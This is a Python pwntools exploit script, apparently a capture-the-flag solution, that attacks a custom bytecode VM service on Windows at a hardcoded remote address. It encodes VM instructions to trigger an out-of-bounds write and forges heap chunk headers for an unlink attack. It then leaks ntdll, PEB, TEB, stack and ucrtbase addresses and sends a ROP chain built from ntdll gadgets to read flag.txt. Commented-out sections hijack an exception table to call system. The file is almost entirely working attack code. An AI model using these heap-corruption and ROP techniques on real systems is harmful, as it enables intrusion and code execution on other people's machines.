from pwn import *
import binascii
import sys

context.arch = 'amd64'
context.log_level = 'debug'

# p = remote("127.0.0.1", 9999)
p = remote("124.71.177.202", 9999)
if len(sys.argv) == 2:
    windbgx.attach(p)

opcode = {
    "HALT":     0x0,
    "ADD":      0x1,
    "SUB":      0x2,
    "MUL":      0x3,
    "DIV":      0x4,
    "LD":       0x5,
    "ST":       0x6,
    "PUSH":     0x7,
    "POP":      0x8,
    "JMP":      0x9,
    "JE":       0xA,
    "JNE":      0xB,
    "CALL":     0xC,
    "RET":      0xD,
    "SYSCALL":  0xE
}

bitwidth = {
    8:  0,
    16: 1,
    32: 2,
    64: 3
}

pack_func = [
    p8,
    p16,
    p32,
    p64
]

'''
     0000       0          00		 000      000       000         ...
    opcode   reg_op     bitwidth   dst_reg  src_reg1  src_reg2      imm
'''

def halt():
    ins = p16(opcode['HALT'])
    return ins

def add_reg_reg(dst, src1, src2, bits_cnt):
    ins_val = opcode['ADD']
    ins_val |= 1 << 4       # reg_op = 1
    ins_val |= bitwidth[bits_cnt] << 5
    ins_val |= dst << 7
    ins_val |= src1 << 10
    ins_val |= src2 << 13
    ins = p16(ins_val)
    return ins

def add_reg_imm(dst, src, imm, bits_cnt):
    ins_val = opcode['ADD']
    ins_val |= bitwidth[bits_cnt] << 5
    ins_val |= dst << 7
    ins_val |= src << 10
    ins = p16(ins_val) + pack_func[bitwidth[bits_cnt]](imm)
    return ins

def sub_reg_reg(dst, src1, src2, bits_cnt):
    ins_val = opcode['SUB']
    ins_val |= 1 << 4       # reg_op = 1
    ins_val |= bitwidth[bits_cnt] << 5
    ins_val |= dst << 7
    ins_val |= src1 << 10
    ins_val |= src2 << 13
    ins = p16(ins_val)
    return ins

def sub_reg_imm(dst, src, imm, bits_cnt):
    ins_val = opcode['SUB']
    ins_val |= bitwidth[bits_cnt] << 5
    ins_val |= dst << 7
    ins_val |= src << 10
    ins = p16(ins_val) + pack_func[bitwidth[bits_cnt]](imm)
    return ins

def mul_reg_reg(dst, src1, src2, bits_cnt):
    ins_val = opcode['MUL']
    ins_val |= 1 << 4       # reg_op = 1
    ins_val |= bitwidth[bits_cnt] << 5
    ins_val |= dst << 7
    ins_val |= src1 << 10
    ins_val |= src2 << 13
    ins = p16(ins_val)
    return ins

def mul_reg_imm(dst, src, imm, bits_cnt):
    ins_val = opcode['MUL']
    ins_val |= bitwidth[bits_cnt] << 5
    ins_val |= dst << 7
    ins_val |= src << 10
    ins = p16(ins_val) + pack_func[bitwidth[bits_cnt]](imm)
    return ins

def div_reg_reg(dst, src1, src2, bits_cnt):
    ins_val = opcode['DIV']
    ins_val |= 1 << 4       # reg_op = 1
    ins_val |= bitwidth[bits_cnt] << 5
    ins_val |= dst << 7
    ins_val |= src1 << 10
    ins_val |= src2 << 13
    ins = p16(ins_val)
    return ins

def div_reg_imm(dst, src, imm, bits_cnt):
    ins_val = opcode['DIV']
    ins_val |= bitwidth[bits_cnt] << 5
    ins_val |= dst << 7
    ins_val |= src << 10
    ins = p16(ins_val) + pack_func[bitwidth[bits_cnt]](imm)
    return ins

def ld(dst, offset, bits_cnt):
    ins_val = opcode['LD']
    ins_val |= bitwidth[bits_cnt] << 5
    ins_val |= dst << 7
    ins = p16(ins_val) + p16(offset)
    return ins

def st(dst, offset, bits_cnt):
    ins_val = opcode['ST']
    ins_val |= bitwidth[bits_cnt] << 5
    ins_val |= dst << 7
    ins = p16(ins_val) + p16(offset)
    return ins

def push_reg(dst):
    ins_val = opcode['PUSH']
    ins_val |= dst << 7
    ins = p16(ins_val)
    return ins

def push_imm(imm):
    ins_val = opcode['PUSH']    
    ins = p16(ins_val) + p64(imm)
    return ins

def pop(dst):
    ins_val = opcode['POP']
    ins_val |= dst << 7
    ins = p16(ins_val)
    return ins

def jmp(offset):
    ins_val = opcode['JMP']   
    ins = p16(ins_val) + p16(offset)
    return ins

def je(src1, src2, offset):
    ins_val = opcode['JE']   
    ins_val |= src1 << 10
    ins_val |= src2 << 13
    ins = p16(ins_val) + p16(offset)
    return ins

def jne(src1, src2, offset):
    ins_val = opcode['JNE']   
    ins_val |= src1 << 10
    ins_val |= src2 << 13
    ins = p16(ins_val) + p16(offset)
    return ins

def call(addr):
    ins_val = opcode['CALL']
    ins = p16(ins_val) + p16(addr)
    return ins

def ret():
    ins = p16(opcode['RET'])
    return ins

def syscall():
    ins = p16(opcode['SYSCALL'])
    return ins

def chunk_head_ctor(size, flags, prev_size, segment_offset, unused_bytes):
    size, prev_size = size >> 4, prev_size >> 4
    chksum = (size >> 8) ^ (size & 0xFF) ^ flags
    head = size | (flags << 16) | (chksum << 24) | (prev_size << 32) | (segment_offset << 48) | (unused_bytes << 56)
    return head

# Leak FileHeap's address
code =  add_reg_imm(0, 7, 0, 8) + add_reg_imm(1, 7, 0, 8) + add_reg_imm(2, 7, 0, 8) + add_reg_imm(3, 7, 8, 8) + syscall()           # read stdin
code += add_reg_imm(0, 7, 2, 8) + add_reg_imm(1, 7, 0, 8) + add_reg_imm(2, 7, 0, 8) + syscall()                                     # open file 3
code += add_reg_imm(0, 7, 1, 8) + add_reg_imm(1, 7, 3, 8) + add_reg_imm(2, 7, 0, 8) + add_reg_imm(3, 7, 8, 8) + syscall()           # write file 3
code += call(0xFFE)

# BufferHeap Fengshui to do unlink attack
code += add_reg_imm(0, 7, 2, 8) + add_reg_imm(1, 7, 0, 8) + add_reg_imm(2, 7, 0, 8) + syscall()                                     # open file 4
code += add_reg_imm(0, 7, 1, 8) + add_reg_imm(1, 7, 4, 8) + add_reg_imm(2, 7, 0, 8) + add_reg_imm(3, 7, 0x38, 8) + syscall()        # write file 4
code += add_reg_imm(0, 7, 2, 8) + add_reg_imm(1, 7, 0, 8) + add_reg_imm(2, 7, 0, 8) + syscall()                                     # open file 5
code += add_reg_imm(0, 7, 1, 8) + add_reg_imm(1, 7, 5, 8) + add_reg_imm(2, 7, 0, 8) + add_reg_imm(3, 7, 0x38, 8) + syscall()        # write file 5
code += add_reg_imm(0, 7, 2, 8) + add_reg_imm(1, 7, 0, 8) + add_reg_imm(2, 7, 0, 8) + syscall()                                     # open file 6
code += add_reg_imm(0, 7, 1, 8) + add_reg_imm(1, 7, 6, 8) + add_reg_imm(2, 7, 0, 8) + add_reg_imm(3, 7, 0x38, 8) + syscall()        # write file 6

# Trigger backdoor to do OOB write
code += add_reg_imm(6, 7, 0x100, 16) + div_reg_reg(0, 7, 6, 8)

# OOB write to hijack chunk head and Flink, Blink
code += add_reg_imm(0, 7, 0, 8) + add_reg_imm(1, 7, 0, 8) + add_reg_imm(2, 7, 0, 8) + add_reg_imm(3, 7, 0x50, 8) + syscall()        # read stdin
code += add_reg_imm(0, 7, 1, 8) + add_reg_imm(1, 7, 4, 8) + add_reg_imm(2, 7, 0, 8) + add_reg_imm(3, 7, 0x50, 8) + syscall()        # write file 4 (OOB write)

# Do unlink attack
code += add_reg_imm(0, 7, 3, 8) + add_reg_imm(1, 7, 4, 8) + syscall()                                                               # close file 4

# now use file 5 to control the struct of file 6 and achieve arbitrary read and write
code += add_reg_imm(0, 7, 0, 8) + add_reg_imm(1, 7, 0, 8) + add_reg_imm(2, 7, 0x8, 8) + add_reg_imm(3, 7, 0x38, 8) + syscall()      # read stdin
code += add_reg_imm(0, 7, 1, 8) + add_reg_imm(1, 7, 5, 8) + add_reg_imm(2, 7, 0x8, 8) + add_reg_imm(3, 7, 0x38, 8) + syscall()      # write file 5
code += add_reg_imm(0, 7, 0, 8) + add_reg_imm(1, 7, 0, 8) + add_reg_imm(2, 7, 0, 8) + add_reg_imm(3, 7, 0x8, 8) + syscall()         # read stdin
code += add_reg_imm(0, 7, 0, 8) + add_reg_imm(1, 7, 6, 8) + add_reg_imm(2, 7, 0x8, 8) + add_reg_imm(3, 7, 0x8, 8) + syscall()       # read file 6
code += add_reg_imm(0, 7, 1, 8) + add_reg_imm(1, 7, 1, 8) + add_reg_imm(2, 7, 0, 8) + add_reg_imm(3, 7, 0x10, 8) + syscall()        # write stdout

# arbitrary read
for i in range(4):
    code += add_reg_imm(0, 7, 0, 8) + add_reg_imm(1, 7, 0, 8) + add_reg_imm(2, 7, 0x8, 8) + add_reg_imm(3, 7, 0x38, 8) + syscall()  # read stdin
    code += add_reg_imm(0, 7, 1, 8) + add_reg_imm(1, 7, 5, 8) + add_reg_imm(2, 7, 0x8, 8) + add_reg_imm(3, 7, 0x38, 8) + syscall()  # write file 5
    code += add_reg_imm(0, 7, 0, 8) + add_reg_imm(1, 7, 6, 8) + add_reg_imm(2, 7, 0x8, 8) + add_reg_imm(3, 7, 0x8, 8) + syscall()   # read file 6
    code += add_reg_imm(0, 7, 1, 8) + add_reg_imm(1, 7, 1, 8) + add_reg_imm(2, 7, 0, 8) + add_reg_imm(3, 7, 0x10, 8) + syscall()    # write stdout

# Bruteforce return address and ROP
code += add_reg_imm(0, 7, 0, 8) + add_reg_imm(1, 7, 0, 8) + add_reg_imm(2, 7, 0x100, 16) + add_reg_imm(3, 7, 0x140, 16) + syscall()   # read stdin
bruteforce_stack_code =  ld(5, 0x138, 64) + ld(4, 0x130, 64) + sub_reg_imm(4, 4, 0x8, 64) + st(4, 0x130, 64)                                                           # stack_addr - 8
bruteforce_stack_code += add_reg_imm(0, 7, 1, 8) + add_reg_imm(1, 7, 5, 8) + add_reg_imm(2, 7, 0x100, 16) + add_reg_imm(3, 7, 0x38, 8) + syscall()  # write file 5
bruteforce_stack_code += add_reg_imm(0, 7, 0, 8) + add_reg_imm(1, 7, 6, 8) + add_reg_imm(2, 7, 0x300, 16) + add_reg_imm(3, 7, 0x8, 8) + syscall()   # read file 6
bruteforce_stack_code += ld(6, 0x300, 64) + jne(5, 6, 0xFFC4) # 4 + 4 + 2 * 2 + 3 * 6 + 4 * 2 + 4 * 2 + 10 + 4 = 60 = 0x3C
code += bruteforce_stack_code
code += add_reg_imm(0, 7, 1, 8) + add_reg_imm(1, 7, 1, 8) + add_reg_imm(2, 7, 0x130, 16) + add_reg_imm(3, 7, 0x8, 8) + syscall()    # write stdout
code += add_reg_imm(0, 7, 1, 8) + add_reg_imm(1, 7, 6, 8) + add_reg_imm(2, 7, 0x140, 16) + add_reg_imm(3, 7, 0x100, 16) + syscall() # write file 6

'''
################ for test
# arbitrary writeg
code += add_reg_imm(0, 7, 0, 8) + add_reg_imm(1, 7, 0, 8) + add_reg_imm(2, 7, 0x8, 8) + add_reg_imm(3, 7, 0x38, 8) + syscall()      # read stdin
code += add_reg_imm(0, 7, 1, 8) + add_reg_imm(1, 7, 5, 8) + add_reg_imm(2, 7, 0x8, 8) + add_reg_imm(3, 7, 0x38, 8) + syscall()      # write file 5
code += add_reg_imm(0, 7, 0, 8) + add_reg_imm(1, 7, 0, 8) + add_reg_imm(2, 7, 0x8, 8) + add_reg_imm(3, 7, 0x38, 8) + syscall()      # read stdin
code += add_reg_imm(0, 7, 1, 8) + add_reg_imm(1, 7, 6, 8) + add_reg_imm(2, 7, 0x8, 8) + add_reg_imm(3, 7, 0x38, 8) + syscall()      # write file 6

# trigger system
code += push_imm(u64("calc\x00\x00\x00\x00"))
code += pop(0)
code += pop(1)
code += pop(1)
################ test done
'''

# End here
code += halt()

# Leak BufferHeap's cookie
code = code.ljust(0xFFE, b"\x00")
code += ret()

# Send code
p.sendafter("Please input your code: \r\n", code)

# Get encoded heap head and calculate heap cookie
p.send("heapaddr")
p.recvuntil("0x0d 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00")
chunk_head = p.recvline()[:-3].replace(b" 0x", b"") + b"0010"
chunk_head = u64(binascii.unhexlify(chunk_head).decode('latin-1'))
heap_cookie = chunk_head ^ chunk_head_ctor(0x1010, 1, 0x1010, 0, 0x10)

# Get FileHeap address from uninitialized chunk
p.recvuntil("heapaddr")
heap_base = u64(p.recvuntil(" ")[:-1].ljust(8, b"\x00")) - 0x150

# Send OOB write payload to do unlink attack
payload =  b'A' * 0x38 
payload += p64(heap_cookie ^ chunk_head_ctor(0x40, 0, 0x40, 0, 0))
payload += p64(heap_base + 0x8d8 - 0x8) + p64(heap_base + 0x8d8)
p.send(payload)

# Send payload to control file 6 to leak ntdll              (1)
payload =  p64(heap_base + 0x8d8)  # change files[5]->buffer = &files[6]->buffer
payload += b'A' * 0x20 + p64(0x100) + p64(heap_base + 0x2c0) # change files[6]->buffer = _HEAP->LockVariable.Lock thus leak the ntdll base
p.send(payload)
p.send("leakaddr") # leak symbol
p.recvuntil("leakaddr")
ntdll_base = u64(p.recv(8)) - 0x163d40
ntdll_pebldr = ntdll_base + 0x1653a0

# Send payload to control file 6 to leak PEB                (2)
payload =  p64(heap_base + 0x8d8)  # change files[5]->buffer = &files[6]->buffer
payload += b'A' * 0x20 + p64(0x100) + p64(ntdll_pebldr - 0x98) # change files[6]->buffer = ntdll!PebLdr - 0x80
p.send(payload)
p.recvuntil("leakaddr")
peb = u64(p.recv(8)) - 0x80
teb = peb + 0x1000

# Send payload to control file 6 to leak StackBase          (3)
payload =  p64(heap_base + 0x8d8)  # change files[5]->buffer = &files[6]->buffer
payload += b'A' * 0x20 + p64(0x100) + p64(teb + 0x8) # change files[6]->buffer = teb + 8 (StackBase)
p.send(payload)
p.recvuntil("leakaddr")
stack_base = u64(p.recv(8))

# Send payload to control file 6 to leak Program base       (4)
payload =  p64(heap_base + 0x8d8)  # change files[5]->buffer = &files[6]->buffer
payload += b'A' * 0x20 + p64(0x100) + p64(peb + 0x10) # change files[6]->buffer = peb + 0x10 (ImageBaseAddress)
p.send(payload)
p.recvuntil("leakaddr")
prog_base = u64(p.recv(8))

# Send payload to control file 6 to leak ucrtbase           (5)
payload =  p64(heap_base + 0x8d8)  # change files[5]->buffer = &files[6]->buffer
payload += b'A' * 0x20 + p64(0x100) + p64(prog_base + 0x4198) # change files[6]->buffer = _write IAT
p.send(payload)
p.recvuntil("leakaddr")
ucrtbase_base = u64(p.recv(8)) - 0x15bf0
ucrtbase_system = ucrtbase_base + 0xabba0

# Prepare bruteforce function stack address
payload =  p64(heap_base + 0x8d8)  # change files[5]->buffer = &files[6]->buffer
payload += b'flag.txt'.ljust(0x20, b"\x00") + p64(0x100) + p64(stack_base) # change files[6]->buffer = stack_base
payload += p64(prog_base + 0x20D2) # target symbol value

pop_rcx =    ntdll_base + 0x9217b   # pop rcx ; ret
pop_rdx =    ntdll_base + 0x8fb37   # pop rdx ; pop r11 ; ret
pop_r8 =     ntdll_base + 0x2010b   # pop r8 ; ret
pop_4regs =  ntdll_base + 0x8fb33   # pop r9 ; pop r10 ; pop r11 ; ret
_open =   ucrtbase_base + 0xa2a30
_read =   ucrtbase_base + 0x16270
_write =  ucrtbase_base + 0x15bf0
ropchain =  p64(pop_rcx) + p64(heap_base + 0x8e0) + p64(pop_rdx) + p64(0) + p64(0) + p64(_open) + p64(pop_4regs) + p64(0) * 4
ropchain += p64(pop_rcx) + p64(3) + p64(pop_rdx) + p64(heap_base + 0x8e0) + p64(0) + p64(pop_r8) + p64(0x40) + p64(_read) + p64(pop_4regs) + p64(0) * 4
ropchain += p64(pop_rcx) + p64(1) + p64(pop_rdx) + p64(heap_base + 0x8e0) + p64(0) + p64(pop_r8) + p64(0x40) + p64(_write)
# ropchain = p64(pop_rcx) + p64(heap_base + 0x8e0) + p64(pop_rcx + 1) + p64(ucrtbase_system)

payload += ropchain
p.send(payload)
function_stack_addr = u64(p.recv(8))

'''
################ for test, write exception table and syscall table

# Send payload to control file 6 to leak StateHeap          (6)
payload =  pg
64(heap_base + 0x8d8)  # change files[5]->buffer = &files[6]->buffer
payload += 'A' * 0x20 + p64(0x100) + p64(ntdll_base + 0x168d40 + 0x10) # change files[6]->buffer = ntdll!RtlpProcessHeapsListBuffer + 0x10 (StateHeap)
p.send(payload)
p.recvuntil("leakaddr")
state_heap_base = u64(p.recv(8))

# Send payload to control file 6 to hijack state->exception_table to system
payload =  p64(heap_base + 0x8d8)  # change files[5]->buffer = &files[6]->buffer
payload += 'A' * 0x20 + p64(0x100) + p64(state_heap_base + 0x8e0) # change files[6]->buffer = state->exception_table
p.send(payload)
payload = p64(ucrtbase_system) * 7
p.send(payload)

################ test done
'''

print("------------- Leaked Information -------------")
print("[+] BufferHeap cookie: " + hex(heap_cookie))
print("[+] BufferHeap base: " + hex(heap_base))
print("[+] ntdll base: " + hex(ntdll_base))
print("[+] ucrtbase base: " + hex(ucrtbase_base))
print("[+] PEB: " + hex(peb))
print("[+] TEB: " + hex(teb))
print("[+] prog_base: " + hex(prog_base))
print("[+] stack_base: " + hex(stack_base))
print("[+] function_stack_addr: " + hex(function_stack_addr))
# print("[+] state_heap_base: " + hex(state_heap_base))

p.interactive()